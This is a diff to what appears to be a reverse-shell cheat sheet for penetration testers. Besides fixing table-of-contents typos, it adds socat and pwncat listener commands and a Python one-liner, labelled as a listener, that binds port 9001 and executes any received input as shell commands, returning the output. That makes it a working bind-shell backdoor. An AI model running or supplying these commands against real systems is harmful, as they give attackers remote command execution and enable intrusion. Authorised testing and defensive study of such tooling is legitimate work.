@@ -1,9 +1,9 @@
 ## Summary
 * [Tools](#tools)
-* [Reverse Listner](#reverse-listener)
+* [Reverse Listener](#reverse-listener)
 * [Reverse Shell](#reverse-shell)
     * [Awk](#awk)
-    * [Automatic Reverse Shell Generator](#revshells)
+    * [Automatic Reverse Shell Generator](#tools)
     * [Bash TCP](#bash-tcp)
     * [Bash UDP](#bash-udp)
     * [C](#c)
@@ -50,6 +50,21 @@
 
 ```bash
 nc -lvnp 9001
+```
+
+### Socat
+
+```bash
+socat -d -d TCP-LISTEN:9001 STDOUT
+socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:9001
+```
+### Python
+
+```python
+python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9001));s1.listen(1);c,a=s1.accept();
+while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
+python3 -m pwncat -lp 9001
 ```
 
 
